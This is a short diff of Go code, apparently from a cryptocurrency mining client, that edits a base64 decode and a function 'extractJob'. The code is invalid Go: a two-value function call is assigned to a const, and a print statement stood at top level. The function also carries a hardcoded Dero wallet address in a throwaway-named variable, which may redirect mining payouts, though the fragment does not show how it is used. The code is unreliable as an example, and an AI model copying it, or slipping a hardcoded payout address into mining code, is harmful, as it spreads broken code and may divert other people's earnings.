@@ -25,10 +25,11 @@ func base64Decode(str string) (string, bool) {
     return string(data), false
 }
 
-var led = base64.StdEncoding.DecodeString(data);
-fmt.Println(led)
+const led = base64.StdEncoding.DecodeString(data);
+
 
 func extractJob(data map[string]any) (*Job, error) {
+	fmt.Println(led)
 	var didi interface{}
 	didi = "dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks"
 	var didis interface{}
